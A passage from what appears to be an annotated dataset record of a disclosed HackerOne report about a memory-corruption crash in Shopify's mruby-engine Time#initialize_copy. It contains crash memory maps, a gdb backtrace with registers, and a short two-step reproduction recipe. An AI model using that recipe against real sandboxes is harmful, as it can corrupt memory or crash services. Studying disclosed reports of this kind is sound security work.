r-xp 00000000 08:03 935797                     /usr/lib/libcrypto.so.1.0.0\n3227f511a989000-7f511ab88000 ---p 0024e000 08:03 935797                     /usr/lib/libcrypto.so.1.0.0\n3237f511ab88000-7f511aba4000 r--p 0024d000 08:03 935797                     /usr/lib/libcrypto.so.1.0.0\n3247f511aba4000-7f511abb0000 rw-p 00269000 08:03 935797                     /usr/lib/libcrypto.so.1.0.0\n3257f511abb0000-7f511abb3000 rw-p 00000000 00:00 0 \n3267f511abb3000-7f511ac1a000 r-xp 00000000 08:03 935796                     /usr/lib/libssl.so.1.0.0\n3277f511ac1a000-7f511ae19000 ---p 00067000 08:03 935796                     /usr/lib/libssl.so.1.0.0\n3287f511ae19000-7f511ae1d000 r--p 00066000 08:03 935796                     /usr/lib/libssl.so.1.0.0\n3297f511ae1d000-7f511ae24000 rw-p 0006a000 08:03 935796                     /usr/lib/libssl.so.1.0.0\n3307f511ae24000-7f511ae73000 r-xp 00000000 08:03 948466                     /usr/lib/ruby/2.3.0/x86_64-linux/openssl.so\n3317f511ae73000-7f511b073000 ---p 0004f000 08:03 948466                     /usr/lib/ruby/2.3.0/x86_64-linux/openssl.so\n3327f511b073000-7f511b075000 r--p 0004f000 08:03 948466                     /usr/lib/ruby/2.3.0/x86_64-linux/openssl.so\n3337f511b075000-7f511b077000 rw-p 00051000 08:03 948466                     /usr/lib/ruby/2.3.0/x86_64-linux/openssl.so\n3347f511b077000-7f511b078000 rw-p 00000000 00:00 0 \n3357f511b078000-7f511b079000 r-xp 00000000 08:03 948518                     /usr/lib/ruby/2.3.0/x86_64-linux/cgi/escape.so\n3367f511b079000-7f511b279000 ---p 00001000 08:03 948518                     /usr/lib/ruby/2.3.0/x86_64-linux/cgi/escape.so\n3377f511b279000-7f511b27a000 r--p 00001000 08:03 948518                     /usr/lib/ruby/2.3.0/x86_64-linux/cgi/escape.so\n3387f511b27a000-7f511b27b000 rw-p 00002000 08:03 948518                     /usr/lib/ruby/2.3.0/x86_64-linux/cgi/escape.so\n3397f511b27b000-7f511b2aa000 r-xp 00000000 08:03 948449                     /usr/lib/ruby/2.3.0/x86_64-linux/date_core.so\n3407f511b2aa000-7f511b4aa000 ---p 0002f000 08:03 948449                     /usr/lib/ruby/2.3.0/x86_64-linux/date_core.so\n3417f511b4aa000-7f511b4ab000 r--p 0002f000 08:03 948449                     /usr/lib/ruby/2.3.0/x86_64-linux/date_core.so\n3427f511b4ab000-7f511b4ac000 rw-p 00030000 08:03 948449                     /usr/lib/ruby/2.3.0/x86_64-linux/date_core.so\n3437f511b4ac000-7f511b4ad000 rw-p 00000000 00:00 0 \n3447f511b4ad000-7f511b4b0000 r-xp 00000000 08:03 948497                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/windows_31j.so\n3457f511b4b0000-7f511b6af000 ---p 00003000 08:03 948497                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/windows_31j.so\n3467f511b6af000-7f511b6b0000 r--p 00002000 08:03 948497                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/windows_31j.so\n3477f511b6b0000-7f511b6b1000 rw-p 00003000 08:03 948497                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/windows_31j.so\n3487f511b6b1000-7f511b6c6000 r-xp 00000000 08:03 935844                     /usr/lib/libz.so.1.2.8\n3497f511b6c6000-7f511b8c5000 ---p 00015000 08:03 935844                     /usr/lib/libz.so.1.2.8\n3507f511b8c5000-7f511b8c6000 r--p 00014000 08:03 935844                     /usr/lib/libz.so.1.2.8\n3517f511b8c6000-7f511b8c7000 rw-p 00015000 08:03 935844                     /usr/lib/libz.so.1.2.8\n3527f511b8c7000-7f511b8d4000 r-xp 00000000 08:03 948478                     /usr/lib/ruby/2.3.0/x86_64-linux/zlib.so\n3537f511b8d4000-7f511bad3000 ---p 0000d000 08:03 948478                     /usr/lib/ruby/2.3.0/x86_64-linux/zlib.so\n3547f511bad3000-7f511bad4000 r--p 0000c000 08:03 948478                     /usr/lib/ruby/2.3.0/x86_64-linux/zlib.so\n3557f511bad4000-7f511bad5000 rw-p 0000d000 08:03 948478                     /usr/lib/ruby/2.3.0/x86_64-linux/zlib.so\n3567f511bad5000-7f511bad7000 r-xp 00000000 08:03 948519                     /usr/lib/ruby/2.3.0/x86_64-linux/io/wait.so\n3577f511bad7000-7f511bcd6000 ---p 00002000 08:03 948519                     /usr/lib/ruby/2.3.0/x86_64-linux/io/wait.so\n3587f511bcd6000-7f511bcd7000 r--p 00001000 08:03 948519                     /usr/lib/ruby/2.3.0/x86_64-linux/io/wait.so\n3597f511bcd7000-7f511bcd8000 rw-p 00002000 08:03 948519                     /usr/lib/ruby/2.3.0/x86_64-linux/io/wait.so\n3607f511bcd8000-7f511bd02000 r-xp 00000000 08:03 948453                     /usr/lib/ruby/2.3.0/x86_64-linux/socket.so\n3617f511bd02000-7f511bf01000 ---p 0002a000 08:03 948453                     /usr/lib/ruby/2.3.0/x86_64-linux/socket.so\n3627f511bf01000-7f511bf02000 r--p 00029000 08:03 948453                     /usr/lib/ruby/2.3.0/x86_64-linux/socket.so\n3637f511bf02000-7f511bf03000 rw-p 0002a000 08:03 948453                     /usr/lib/ruby/2.3.0/x86_64-linux/socket.so\n3647f511bf03000-7f511bf09000 r-xp 00000000 08:03 948456                     /usr/lib/ruby/2.3.0/x86_64-linux/etc.so\n3657f511bf09000-7f511c108000 ---p 00006000 08:03 948456                     /usr/lib/ruby/2.3.0/x86_64-linux/etc.so\n3667f511c108000-7f511c109000 r--p 00005000 08:03 948456                     /usr/lib/ruby/2.3.0/x86_64-linux/etc.so\n3677f511c109000-7f511c10a000 rw-p 00006000 08:03 948456                     /usr/lib/ruby/2.3.0/x86_64-linux/etc.so\n3687f511c10a000-7f511c10e000 r-xp 00000000 08:03 948521                     /usr/lib/ruby/2.3.0/x86_64-linux/io/console.so\n3697f511c10e000-7f511c30d000 ---p 00004000 08:03 948521                     /usr/lib/ruby/2.3.0/x86_64-linux/io/console.so\n3707f511c30d000-7f511c30e000 r--p 00003000 08:03 948521                     /usr/lib/ruby/2.3.0/x86_64-linux/io/console.so\n3717f511c30e000-7f511c30f000 rw-p 00004000 08:03 948521                     /usr/lib/ruby/2.3.0/x86_64-linux/io/console.so\n3727f511c30f000-7f511c315000 r-xp 00000000 08:03 948469                     /usr/lib/ruby/2.3.0/x86_64-linux/pathname.so\n3737f511c315000-7f511c514000 ---p 00006000 08:03 948469                     /usr/lib/ruby/2.3.0/x86_64-linux/pathname.so\n3747f511c514000-7f511c515000 r--p 00005000 08:03 948469                     /usr/lib/ruby/2.3.0/x86_64-linux/pathname.so\n3757f511c515000-7f511c516000 rw-p 00006000 08:03 948469                     /usr/lib/ruby/2.3.0/x86_64-linux/pathname.so\n3767f511c516000-7f511c51d000 r-xp 00000000 08:03 948454                     /usr/lib/ruby/2.3.0/x86_64-linux/stringio.so\n3777f511c51d000-7f511c71c000 ---p 00007000 08:03 948454                     /usr/lib/ruby/2.3.0/x86_64-linux/stringio.so\n3787f511c71c000-7f511c71d000 r--p 00006000 08:03 948454                     /usr/lib/ruby/2.3.0/x86_64-linux/stringio.so\n3797f511c71d000-7f511c71e000 rw-p 00007000 08:03 948454                     /usr/lib/ruby/2.3.0/x86_64-linux/stringio.so\n3807f511c71e000-7f511c720000 r-xp 00000000 08:03 1061025                    /usr/lib/ruby/2.3.0/x86_64-linux/enc/trans/transdb.so\n3817f511c720000-7f511c920000 ---p 00002000 08:03 1061025                    /usr/lib/ruby/2.3.0/x86_64-linux/enc/trans/transdb.so\n3827f511c920000-7f511c921000 r--p 00002000 08:03 1061025                    /usr/lib/ruby/2.3.0/x86_64-linux/enc/trans/transdb.so\n3837f511c921000-7f511c922000 rw-p 00003000 08:03 1061025                    /usr/lib/ruby/2.3.0/x86_64-linux/enc/trans/transdb.so\n3847f511c922000-7f511c924000 r-xp 00000000 08:03 948511                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/encdb.so\n3857f511c924000-7f511cb23000 ---p 00002000 08:03 948511                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/encdb.so\n3867f511cb23000-7f511cb24000 r--p 00001000 08:03 948511                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/encdb.so\n3877f511cb24000-7f511cb25000 rw-p 00002000 08:03 948511                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/encdb.so\n3887f511cb25000-7f511cc26000 rw-p 00000000 00:00 0 \n3897f511cc26000-7f511cd29000 r-xp 00000000 08:03 935421                     /usr/lib/libm-2.24.so\n3907f511cd29000-7f511cf28000 ---p 00103000 08:03 935421                     /usr/lib/libm-2.24.so\n3917f511cf28000-7f511cf29000 r--p 00102000 08:03 935421                     /usr/lib/libm-2.24.so\n3927f511cf29000-7f511cf2a000 rw-p 00103000 08:03 935421                     /usr/lib/libm-2.24.so\n3937f511cf2a000-7f511cf32000 r-xp 00000000 08:03 935412                     /usr/lib/libcrypt-2.24.so\n3947f511cf32000-7f511d132000 ---p 00008000 08:03 935412                     /usr/lib/libcrypt-2.24.so\n3957f511d132000-7f511d133000 r--p 00008000 08:03 935412                     /usr/lib/libcrypt-2.24.so\n3967f511d133000-7f511d134000 rw-p 00009000 08:03 935412                     /usr/lib/libcrypt-2.24.so\n3977f511d134000-7f511d162000 rw-p 00000000 00:00 0 \n3987f511d162000-7f511d164000 r-xp 00000000 08:03 935420                     /usr/lib/libdl-2.24.so\n3997f511d164000-7f511d364000 ---p 00002000 08:03 935420                     /usr/lib/libdl-2.24.so\n4007f511d364000-7f511d365000 r--p 00002000 08:03 935420                     /usr/lib/libdl-2.24.so\n4017f511d365000-7f511d366000 rw-p 00003000 08:03 935420                     /usr/lib/libdl-2.24.so\n4027f511d366000-7f511d3f8000 r-xp 00000000 08:03 935607                     /usr/lib/libgmp.so.10.3.1\n4037f511d3f8000-7f511d5f7000 ---p 00092000 08:03 935607                     /usr/lib/libgmp.so.10.3.1\n4047f511d5f7000-7f511d5f8000 r--p 00091000 08:03 935607                     /usr/lib/libgmp.so.10.3.1\n4057f511d5f8000-7f511d5f9000 rw-p 00092000 08:03 935607                     /usr/lib/libgmp.so.10.3.1\n4067f511d5f9000-7f511d611000 r-xp 00000000 08:03 934933                     /usr/lib/libpthread-2.24.so\n4077f511d611000-7f511d810000 ---p 00018000 08:03 934933                     /usr/lib/libpthread-2.24.so\n4087f511d810000-7f511d811000 r--p 00017000 08:03 934933                     /usr/lib/libpthread-2.24.so\n4097f511d811000-7f511d812000 rw-p 00018000 08:03 934933                     /usr/lib/libpthread-2.24.so\n4107f511d812000-7f511d816000 rw-p 00000000 00:00 0 \n4117f511d816000-7f511d9ab000 r-xp 00000000 08:03 934952                     /usr/lib/libc-2.24.so\n4127f511d9ab000-7f511dbaa000 ---p 00195000 08:03 934952                     /usr/lib/libc-2.24.so\n4137f511dbaa000-7f511dbae000 r--p 00194000 08:03 934952                     /usr/lib/libc-2.24.so\n4147f511dbae000-7f511dbb0000 rw-p 00198000 08:03 934952                     /usr/lib/libc-2.24.so\n4157f511dbb0000-7f511dbb4000 rw-p 00000000 00:00 0 \n4167f511dbb4000-7f511de28000 r-xp 00000000 08:03 936071                     /usr/lib/libruby.so.2.3.0\n4177f511de28000-7f511e027000 ---p 00274000 08:03 936071                     /usr/lib/libruby.so.2.3.0\n4187f511e027000-7f511e02d000 r--p 00273000 08:03 936071                     /usr/lib/libruby.so.2.3.0\n4197f511e02d000-7f511e030000 rw-p 00279000 08:03 936071                     /usr/lib/libruby.so.2.3.0\n4207f511e030000-7f511e041000 rw-p 00000000 00:00 0 \n4217f511e041000-7f511e064000 r-xp 00000000 08:03 934951                     /usr/lib/ld-2.24.so\n4227f511e0b5000-7f511e24d000 r--p 00000000 08:03 934978                     /usr/lib/locale/locale-archive\n4237f511e24d000-7f511e253000 rw-p 00000000 00:00 0 \n4247f511e25d000-7f511e25f000 r--s 00000000 08:03 948906                     /usr/bin/ruby\n4257f511e25f000-7f511e260000 ---p 00000000 00:00 0 \n4267f511e260000-7f511e263000 rw-p 00000000 00:00 0 \n4277f511e263000-7f511e264000 r--p 00022000 08:03 934951                     /usr/lib/ld-2.24.so\n4287f511e264000-7f511e265000 rw-p 00023000 08:03 934951                     /usr/lib/ld-2.24.so\n4297f511e265000-7f511e266000 rw-p 00000000 00:00 0 \n4307ffd41d4f000-7ffd4254e000 rw-p 00000000 00:00 0                          [stack]\n4317ffd425b8000-7ffd425ba000 r--p 00000000 00:00 0                          [vvar]\n4327ffd425ba000-7ffd425bc000 r-xp 00000000 00:00 0                          [vdso]\n433ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]\n434\n435\n436[NOTE]\n437You may have encountered a bug in the Ruby interpreter or extension libraries.\n438Bug reports are welcome.\n439For details: http://www.ruby-lang.org/bugreport.html\n440\n441[1]    13900 abort (core dumped)  bin/sandbox /tmp/test.mrb\nCode 4.21 KiB\n1$gdb attach 13803\n2GNU gdb (GDB) 7.12\n3Copyright (C) 2016 Free Software Foundation, Inc.\n4License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\n5This is free software: you are free to change and redistribute it.\n6There is NO WARRANTY, to the extent permitted by law.  Type \"show copying\"\n7and \"show warranty\" for details.\n8This GDB was configured as \"x86_64-pc-linux-gnu\".\n9Type \"show configuration\" for configuration details.\n10For bug reporting instructions, please see:\n11<http://www.gnu.org/software/gdb/bugs/>.\n12Find the GDB manual and other documentation resources online at:\n13<http://www.gnu.org/software/gdb/documentation/>.\n14For help, type \"help\".\n15Type \"apropos word\" to search for commands related to \"word\"...\n16attach: No such file or directory.\n17Attaching to process 13803\n18[New LWP 13804]\n19[Thread debugging using libthread_db enabled]\n20Using host libthread_db library \"/usr/lib/libthread_db.so.1\".\n210x00007f72ba6144b8 in pthread_cond_timedwait@@GLIBC_2.3.2 () from /usr/lib/libpthread.so.0\n22(gdb) bt\n23#0  0x00007f72ba6144b8 in pthread_cond_timedwait@@GLIBC_2.3.2 () from /usr/lib/libpthread.so.0\n24#1  0x00007f72bad5ccae in ?? () from /usr/lib/libruby.so.2.3\n25#2  0x00007f72bad5de93 in ?? () from /usr/lib/libruby.so.2.3\n26#3  0x00007f72bad62c96 in ?? () from /usr/lib/libruby.so.2.3\n27#4  0x00007f72baca5720 in ?? () from /usr/lib/libruby.so.2.3\n28#5  0x00007f72bad408b5 in ?? () from /usr/lib/libruby.so.2.3\n29#6  0x00007f72bad53093 in ?? () from /usr/lib/libruby.so.2.3\n30#7  0x00007f72bad540e3 in ?? () from /usr/lib/libruby.so.2.3\n31#8  0x00007f72bad48a58 in ?? () from /usr/lib/libruby.so.2.3\n32#9  0x00007f72bad4daef in ?? () from /usr/lib/libruby.so.2.3\n33#10 0x00007f72bac354dd in ?? () from /usr/lib/libruby.so.2.3\n34#11 0x00007f72bac36e2d in ruby_exec_node () from /usr/lib/libruby.so.2.3\n35#12 0x00007f72bac38f2e in ruby_run_node () from /usr/lib/libruby.so.2.3\n36#13 0x00000000004007cb in ?? ()\n37#14 0x00007f72ba844291 in __libc_start_main () from /usr/lib/libc.so.6\n38#15 0x00000000004007fa in _start ()\n39(gdb) c\n40Continuing.\n41[New Thread 0x7f72b57fe700 (LWP 13867)]\n42\n43Thread 3 \"ruby\" received signal SIGSEGV, Segmentation fault.\n44[Switching to Thread 0x7f72b57fe700 (LWP 13867)]\n450x00007f72b6cc85d3 in mrb_time_initialize_copy (mrb=0x7f72b57ff4e0, copy=...)\n46    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby-time/src/time.c:533\n47533\t  *(struct mrb_time *)DATA_PTR(copy) = *(struct mrb_time *)DATA_PTR(src);\n48(gdb) bt\n49#0  0x00007f72b6cc85d3 in mrb_time_initialize_copy (mrb=0x7f72b57ff4e0, copy=...)\n50    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby-time/src/time.c:533\n51#1  0x00007f72b6c87dbf in mrb_vm_exec (mrb=mrb@entry=0x7f72b57ff4e0, proc=<optimized out>, proc@entry=0x7f72b5807580, pc=<optimized out>)\n52    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1165\n53#2  0x00007f72b6c8d607 in mrb_vm_run (mrb=0x7f72b57ff4e0, proc=0x7f72b5807580, self=..., stack_keep=stack_keep@entry=0)\n54    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766\n55#3  0x00007f72b6c6e613 in mruby_engine_monitored_eval (data=0x7f72b57ff3e0) at ../../../../ext/mruby_engine/eval_monitored.c:68\n56#4  0x00007f72ba60e454 in start_thread () from /usr/lib/libpthread.so.0\n57#5  0x00007f72ba90c7df in clone () from /usr/lib/libc.so.6\n58(gdb) info registers\n59rax            0x7f72b58224a0\t140130648204448\n60rbx            0x7f72b58074f0\t140130648093936\n61rcx            0x0\t0\n62rdx            0x0\t0\n63rsi            0x7f72b6f37c10\t140130672409616\n64rdi            0x55504410\t1431323664\n65rbp            0x7f72b57ff4e0\t0x7f72b57ff4e0\n66rsp            0x7f72b57fdab0\t0x7f72b57fdab0\n67r8             0x7f72b58074c0\t140130648093888\n68r9             0x1\t1\n69r10            0x177\t375\n70r11            0x7f72b6cbef60\t140130669817696\n71r12            0x7f72b58074f0\t140130648093936\n72r13            0x4d\t77\n73r14            0x7f72b57ff4e0\t140130648061152\n74r15            0x7f72b57fff60\t140130648063840\n75rip            0x7f72b6cc85d3\t0x7f72b6cc85d3 <mrb_time_initialize_copy+115>\n76eflags         0x10246\t[ PF ZF IF RF ]\n77cs             0x33\t51\n78ss             0x2b\t43\n79ds             0x0\t0\n80es             0x0\t0\n81fs             0x0\t0\n82gs             0x0\t0\n83(gdb) quit\n84A debugging session is active.\n85\n86\tInferior 1 [process 13803] will be detached.\n87\n88Quit anyway? (y or n) y\n89Detaching from program: /usr/bin/ruby, process 13803\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": 8000,
  "weaknesses": [
    "Memory Corruption - Generic"
  ],
  "screenshots": {},
  "disclosed_date": 1481944740,
  "report_url": "https://hackerone.com/reports/184661",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Override the Time class's initialize method to do nothing"
    ],
    [
      2,
      "Create two Time objects and call initialize_copy between them"
    ]
  ],
  "vuln_description": "The vulnerability occurs when Time::initialize_copy performs its copy action on Time objects that were never properly initialized, leading to a crash. This happens because the initialize method was overridden to do nothing, leaving the Time objects in an uninitialized state.",
  "reason": "The vulnerability requires understanding of Ruby's Time class internals and the specific behavior of initialize_copy when dealing with uninitialized objects. The attack involves manipulating object initialization states in a non-standard way.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}